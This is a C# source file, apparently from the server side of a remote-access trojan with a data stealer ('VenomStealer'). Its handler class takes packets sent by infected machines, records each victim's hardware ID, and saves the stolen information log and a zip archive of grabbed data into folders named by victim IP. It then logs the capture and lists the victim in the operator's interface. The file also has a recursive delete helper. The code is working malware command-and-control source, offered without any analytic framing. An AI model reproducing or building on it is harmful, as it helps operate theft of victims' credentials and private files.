using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Server.Connection;

namespace Server.Handle_Packet;

public class HandleStealer
{
	public static void RecursiveDelete(string path)
	{
		if (!Directory.Exists(path))
		{
			return;
		}
		string[] files = Directory.GetFiles(path);
		foreach (string path2 in files)
		{
			try
			{
				File.Delete(path2);
			}
			catch
			{
			}
		}
		files = Directory.GetDirectories(path);
		for (int i = 0; i < files.Length; i++)
		{
			RecursiveDelete(files[i]);
		}
	}

	public void SaveData(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
			string text = Path.Combine("ClientsFolder", client.Ip, "VenomStealer");
			string text2 = Path.Combine(Application.StartupPath, "ClientsFolder", client.Ip, "VenomStealer");
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			string path = text2 + "\\Logs.txt";
			string asString = unpack_msgpack.ForcePathObject("info").AsString;
			File.WriteAllText(path, asString);
			byte[] asBytes = unpack_msgpack.ForcePathObject("zip").GetAsBytes();
			string path2 = text2 + "\\VenomSteal.zip";
			if (File.Exists(path2))
			{
				File.Delete(path2);
			}
			File.WriteAllBytes(path2, asBytes);
			new HandleLogs().Addmsg("GrabData from " + client.Ip + " is Saved to " + text + "!", Color.Blue);
			Program.mainform.AddGrabClient(client.Ip);
			client?.Disconnected();
		}
		catch (Exception ex)
		{
			new HandleLogs().Addmsg("Save stealer file fail " + ex.Message, Color.Red);
		}
	}
}
